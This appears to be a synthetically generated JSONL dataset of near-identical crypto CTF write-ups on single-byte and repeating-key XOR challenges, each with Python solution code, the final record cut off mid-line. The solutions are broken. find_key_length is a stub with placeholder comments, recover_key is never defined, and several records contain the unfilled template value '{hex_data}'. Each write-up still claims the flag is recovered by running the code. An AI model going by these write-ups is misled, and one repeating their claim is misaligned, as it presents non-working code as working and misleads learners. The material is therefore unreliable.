{"id": "synthetic_xor_019", "team": "synthetic_team_6", "event": "CTF_2024_Event_18", "challenge_name": "Multi-byte XOR Key Reuse #20", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"abef4190413f97facdb50a5b8b1738e1bcf75efa7a24b521f847fcfa26cae6ed\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"abef4190413f97facdb50a5b8b1738e1bcf75efa7a24b521f847fcfa26cae6ed\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/19", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828515", "synthetic": true}
{"id": "synthetic_xor_020", "team": "synthetic_team_8", "event": "CTF_2024_Event_18", "challenge_name": "Single Byte XOR #21", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/20", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828559", "synthetic": true}
{"id": "synthetic_xor_021", "team": "synthetic_team_5", "event": "CTF_2024_Event_11", "challenge_name": "Multi-byte XOR Key Reuse #22", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"d27abdad823efbae727080a0d1b745ef473a59c33f6ff66e7562674b9cc28c6b\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"d27abdad823efbae727080a0d1b745ef473a59c33f6ff66e7562674b9cc28c6b\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/21", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828592", "synthetic": true}
{"id": "synthetic_xor_022", "team": "synthetic_team_3", "event": "CTF_2024_Event_11", "challenge_name": "Multi-byte XOR Key Reuse #23", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"899a8cfc1f4e51e777d475d060ef674a866790317a674dff35203c73920b2298\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"899a8cfc1f4e51e777d475d060ef674a866790317a674dff35203c73920b2298\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/22", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828629", "synthetic": true}
{"id": "synthetic_xor_023", "team": "synthetic_team_4", "event": "CTF_2024_Event_17", "challenge_name": "Multi-byte XOR Key Reuse #24", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"5c8be87a5d563a7f5b4dfd5daf5e3f079dc44e9ff8ab00f93e91aceea0c17bb2\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"5c8be87a5d563a7f5b4dfd5daf5e3f079dc44e9ff8ab00f93e91aceea0c17bb2\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/23", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828660", "synthetic": true}
{"id": "synthetic_xor_024", "team": "synthetic_team_1", "event": "CTF_2024_Event_16", "challenge_name": "Single Byte XOR #25", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/24", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828694", "synthetic": true}
{"id": "synthetic_xor_025", "team": "synthetic_team_2", "event": "CTF_2024_Event_1", "challenge_name": "Multi-byte XOR Key Reuse #26", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"dcaf3fb167dccbe4c6e494207945bfce08e90749394ed1f5a04d7aae0b47711c\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"dcaf3fb167dccbe4c6e494207945bfce08e90749394ed1f5a04d7aae0b47711c\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/25", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828725", "synthetic": true}
{"id": "synthetic_xor_026", "team": "synthetic_team_9", "event": "CTF_2024_Event_7", "challenge_name": "Single Byte XOR #27", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/26", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828756", "synthetic": true}
{"id": "synthetic_xor_027", "team": "synthetic_team_8", "event": "CTF_2024_Event_10", "challenge_name": "Single Byte XOR #28", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/27", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828788", "synthetic": true}
{"id": "synthetic_xor_028", "team": "synthetic_team_9", "event": "CTF_2024_Event_9", "challenge_name": "Single Byte XOR #29", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/28", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828819", "synthetic": true}
{"id": "synthetic_xor_029", "team": "synthetic_team_8", "event": "CTF_2024_Event_11", "challenge_name": "Single Byte XOR #30", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/29", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828850", "synthetic": true}
{"id": "synthetic_xor_030", "team": "synthetic_team_1", "event": "CTF_2024_Event_13", "challenge_name": "Single Byte XOR #31", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/30", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828883", "synthetic": true}
{"id": "synthetic_xor_031", "team": "synthetic_team_7", "event": "CTF_2024_Event_17", "challenge_name": "Multi-byte XOR Key Reuse #32", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"aa1d9d04559f55012e69affbf811291614c273fa148a0651946f0e0b3381f469\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"aa1d9d04559f55012e69affbf811291614c273fa148a0651946f0e0b3381f469\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/31", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828915", "synthetic": true}
{"id": "synthetic_xor_032", "team": "synthetic_team_10", "event": "CTF_2024_Event_6", "challenge_name": "Multi-byte XOR Key Reuse #33", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"7fae43cd7a21da58852ac2b93e53e1f64f4818e475ba75eec5cb6d5c90e6558f\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"7fae43cd7a21da58852ac2b93e53e1f64f4818e475ba75eec5cb6d5c90e6558f\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/32", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828946", "synthetic": true}
{"id": "synthetic_xor_033", "team": "synthetic_team_7", "event": "CTF_2024_Event_6", "challenge_name": "Single Byte XOR #34", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/33", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.828978", "synthetic": true}
{"id": "synthetic_xor_034", "team": "synthetic_team_1", "event": "CTF_2024_Event_16", "challenge_name": "Single Byte XOR #35", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/34", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829347", "synthetic": true}
{"id": "synthetic_xor_035", "team": "synthetic_team_2", "event": "CTF_2024_Event_18", "challenge_name": "Multi-byte XOR Key Reuse #36", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"6c918ded0f11985675b48f81ae6d7a0d33b0695192c74f79bf85710a93ca0b7f\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = 